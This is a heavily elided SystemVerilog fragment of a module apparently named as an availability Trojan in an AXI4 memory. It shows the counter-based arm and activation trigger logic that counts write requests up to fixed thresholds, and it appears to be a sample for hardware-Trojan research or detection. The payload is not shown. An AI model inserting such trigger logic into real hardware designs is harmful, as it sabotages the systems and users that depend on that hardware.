...
module Axi4Memory_trojan_Availability
(
...
output
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 8054;
    localparam int ACTIVATE_DELAY = 4027;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && axi_awvalid) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && axi_awvalid) trojan_counter2 <= trojan_counter2 + 1;
